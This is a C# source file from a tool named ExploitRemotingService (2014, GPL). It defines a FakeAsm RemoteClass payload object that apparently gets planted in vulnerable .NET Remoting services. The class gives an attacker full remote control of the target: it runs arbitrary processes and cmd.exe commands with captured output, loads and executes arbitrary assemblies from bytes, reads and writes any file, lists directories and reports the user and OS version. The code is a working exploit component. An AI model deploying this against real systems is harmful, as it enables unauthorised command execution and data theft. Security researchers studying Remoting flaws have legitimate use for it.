//    ExploitRemotingService
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace FakeAsm
{
    [Guid("62A9EA9C-434D-4145-B84A-A8FF3092D212")]
    public class RemoteClass : MarshalByRefObject, IRemoteClass
    {
        public Process RunProcess(string process, string args)
        {
            return Process.Start(process, args);
        }

        public string RunCommand(string cmd)
        {
            Process proc = new Process();
            ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true
            };
            proc.StartInfo = info;
            proc.Start();

            string strOutput = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return strOutput;
        }

        public int ExecuteAssembly(byte[] asm, string[] args)
        {
            Assembly a = Assembly.Load(asm);

            MethodInfo mi = a.EntryPoint;

            if (mi == null)
            {
                return -1;
            }
            else
            {
                ParameterInfo[] pis = mi.GetParameters();
                object[] newargs;

                if (pis.Length > 0)
                {
                    newargs = new object[] { args };
                }
                else
                {
                    newargs = new object[0];
                }

                object ret = mi.Invoke(null, newargs);

                if ((mi.ReturnType == typeof(int)) && (ret is int))
                {
                    return (int)ret;
                }
                else
                {
                    return 0;
                }
            }
        }

        public DirectoryInfo GetDirectory(string path)
        {
            return new DirectoryInfo(path);
        }

        public void WriteFile(string path, byte[] contents)
        {
            File.WriteAllBytes(path, contents);
        }

        public byte[] ReadFile(string path)
        {
            return File.ReadAllBytes(path);
        }

        public string GetUsername()
        {
            return Environment.UserName;
        }

        public OperatingSystem GetOSVersion()
        {
            return Environment.OSVersion;
        }
    }
}
